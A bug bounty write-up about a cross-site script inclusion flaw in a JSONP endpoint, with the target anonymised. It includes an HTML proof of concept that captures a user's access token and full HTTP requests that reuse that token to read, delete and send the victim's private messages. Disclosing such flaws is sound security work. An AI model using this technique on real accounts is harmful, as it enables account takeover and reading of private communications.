# XSSI (Cross Site Script Inclusion) to Steal AccessToken and More

## Description -:

XSSI refers to a client side web vulnerability which takes advantage of the fact that inclusion via `script` tags are exempted from SOP (or Same Origin Policy defined by RFC 6454) of browsers. The problem arises when dynamic JavaScript or JSONP (JSON with Padding) based on user's session is utilized to share cross domain resources.

I've found that the confidential data including the Access Token and UID is sent inside a JSONP response and consequently an attacker is able to define a function and reference the API call against the JSONP endpoint in order to exfiltrate the token and UUID values within the JSON object. This further enables an attacker to perform a variety of READ/WRITE operations on behalf of the user's account including reading private messages of the user, deleting messages from user's account, sending messages from user's account to anyone along with the attachments and many other operations. 

**NOTE** to respect the nondisclosure policy of the program, the actual vulnerable asset is not disclosed and the same has been referenced as `staging.vulnerable.com` wherever necessary.

## Proof of Concept to Steal AccessToken -:

An attacker can define their own JSONP callback function (for ex `calc`) at the vulnerable endpoint -:

![A](https://user-images.githubusercontent.com/58471667/230939082-c5d38896-2cf6-4b36-8712-8004cf56c646.png)

This could be achieved by passing a callback to the API response (via the `callback` parameter), which will be wrapped around the JSON object, allowing us to load the API response between script tags to further handle it -:

```
<html>
<script>
function calc(s)
{
alert(JSON.stringify(s));
}
</script>

<script src="https://staging.vulnerable.com/account/messagecenter/headerwidget/params?callback=calc"></script>

</html>
```

Host the above script at your server. Access it's URL as an authenticated user and observe that it has now accessed your AccessToken and UID values -:

![B](https://user-images.githubusercontent.com/58471667/230939136-8aa1bf8e-774a-4993-baac-6c6309f4cd7a.png)

## Proof of Concept to Read/Delete/Send Messages from user account and more -:

Acquiring the access token and UID was not a big challenge but rather identifying their usage was indeed. It is usually a boring and time consuming process to browse through the doc and search if the `accessToken` value is of any use ? If Yes, then where and how to use them ? Unfortunately, after spending approximately an hour, I found that there is nothing about the `accessToken` or related information within the documentation. But later on I continued my search, and from somewhere I came to know that the `accessToken` I've acquired is depreciated and the application does not utilize it anymore for any of their functionalities. At this point I felt that I literally wasted my time. So I dropped working on this finding and moved on to my other work.

But the next day, I again thought about putting in some blind efforts. Though deprecated, I felt looking out for any API calls to put in some random final tries. So I started looking around on all the requests and responses. Soon after, I stumbled myself upon one of the XHR request passed as -:

```http
GET /api/communication-service/conversation?showHidden=true HTTP/1.1
Host: staging.vulnerable.com
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Connection: close
Referer: https://staging.vulnerable.com/account/messagecenter
Cookie: COOKIE_VALUES_HERE
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
```

I removed the cookies from this request and started applying the `accessToken` value in a hope that it may turn out to be a valid authentication token. After a few trials, I randomly passed the token as a Bearer token header -:

```http
GET /api/communication-service/conversation?showHidden=true HTTP/1.1
Host: staging.vulnerable.com
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Connection: close
Referer: https://staging.vulnerable.com/account/messagecenter
Authorization: bearer xxxxxxxxxxxxxxxxxxxxx
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
```

And Yeah ! It worked. So this was basically an another issue with the application which demonstrated that even the deprecated `accessToken` value is still accepted against the `/api/communication-service/conversation` endpoint (and a few others) when passed within a Bearer token header.

### Reading all private messages of user :

The above request fetched all the messages, dates, usernames, along with the `accountId` and `conversationId` of the users involved in the conversation.

Replay the following request to fetch details of a particular conversation of user (replace `CONVERSATION-ID` with the `conversationId` we fetched in previous step) -:

```http
GET /api/communication-service/conversation/CONVERSATION-ID/message HTTP/1.1
Host: staging.vulnerable.com
Authorization: bearer xxxxxxxxxxxxxxxxxxxxxxxxxxx
Connection: close
sec-ch-ua: "Google Chrome";v="95", "Chromium";v="95", ";Not A Brand";v="99"
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie:
```

Replay the following request to fetch conversation with a particular participant from the user's account (replace `ACCOUNT-ID` with the `accountid` we fetched in the initial step) -:

```http
GET /api/communication-service/conversation?participantIds=ACCOUNT-ID&showHidden=true HTTP/1.1
Host: staging.vulnerable.com
Authorization: bearer xxxxxxxxxxxxxxxxxxxxxxxxxxx
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Connection: close
Cookie: 
```

### Deleting all private messages of user :

Replay the following request to delete a particular message from user's account (replace `CONVERSATION-ID` with the `conversationId` and `637712054644701721` with the `messageid` we fetched in the initial step) -:

```http
DELETE /api/communication-service/conversation/CONVERSATION-ID/message/637712054644701721 HTTP/1.1
Host: staging.vulnerable.com
Authorization: bearer xxxxxxxxxxxxxxxxxx
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Origin: https://staging.vulnerable.com
Connection: close
Cookie: 
```

### Sending messages from user's account to anyone (along with attachments) :

There are two scenarios for this section. First is about sending a message to anyone with whom the user never had the conversation, and the other section is about sending the message to someone with whom the user is already having a conversation.

To create a new conversation with anyone from user's account, replay the following request (replace `UID` with user's `accountPublicGuid` and replace `ACCOUNT-ID` with the `accountId` to whom you want user to send a message to) 

```http
POST /api/communication-service/conversation HTTP/1.1
Host: staging.vulnerable.com
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
X-Requested-With: XMLHttpRequest
Content-Length: 445
Origin: https://staging.vulnerable.com
Authorization: bearer xxxxxxxxxxxxxxxxxxxxxxx
Connection: close
Cookie: 

{"createDate":"2021-10-30T15:41:53.697Z","createdBy":"UID","lastMessageCreatedBy":"UID","lastMessageDate":"2021-10-30T15:41:53.697Z","lastMessageId":null,"lastMessageText":"---","state":0,"participants":[{"accountId":"ACCOUNT-ID","createDate":null,"lastViewedMessageId":null,"profileImageUrl":null,"securityType":null,"username":null,"isAuthor":false}]}
```

Now in the response observe the first `id` value in the rendered JSON (This value would be the new conversation `id`) -:

![C](https://user-images.githubusercontent.com/58471667/230939216-e5ac39f1-4a6b-4e38-8107-68add73cd6b9.png)

Now use this newly generated conversationid in the below request to send a message (replace `UID` with user's `accountPublicGuid`) -:

```http
POST /api/communication-service/conversation/3a2c54d5-4706-4478-8965-da32256138fb/message HTTP/1.1
Host: staging.vulnerable.com
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
X-Requested-With: XMLHttpRequest
Content-Length: 178
Origin: https://staging.vulnerable.com
Connection: close
Authorization: bearer xxxxxxxxxxxxxxxxx
Cookie: 

{"attachments":[],"createDate":"2021-10-30T15:43:49.837Z","createdBy":"UID","messageText":"","sid":"","message":"ATTACKER_MESSAGE_FROM_VICTIM_ACCOUNT"}
```

Now to send a message within an existing conversation from within the user's account, just replay the previous request with appropriate "conversationid". This conversationid you would have achieved from the response of the very initial message reading request.

Similarly, apart from messaging related operations an attacker is also able to fetch all the `Lists`, create new `Lists` etc from the behalf of user's account.

## Impact -:

Consequently, this gives the attacker the capability to takeover some of the crucial aspects of the user's account.

It would be unfortunate if such an Access Token stealing URL is Emailed to mass users or is posted at public forum/blogs in the form of comments etc. All it would require from the user end would be a single click to hand over their account's most sensitive functionalities to the attacker.

## Conclusion -:

With the emergence of CORS and postMessage() for cross origin communication, nowadays it's very rare to find XSSI vulnerabilities through the JSONP endpoints. Dynamic JS files may still yield some good results. But once found, these issues have the potential to escalate your submission at an appropriately severe level provided you're able to chain every other flaw that you found during your exploration of application.

**Reward** -:

Severity assigned : P2 or High  
Bounty assigned : $1,250

![D](https://user-images.githubusercontent.com/58471667/230940982-835d6712-cd18-46ac-ba8e-8fb1da288e51.png)

*Find me on [@AnkitCuriosity](https://twitter.com/AnkitCuriosity) for more updates!*
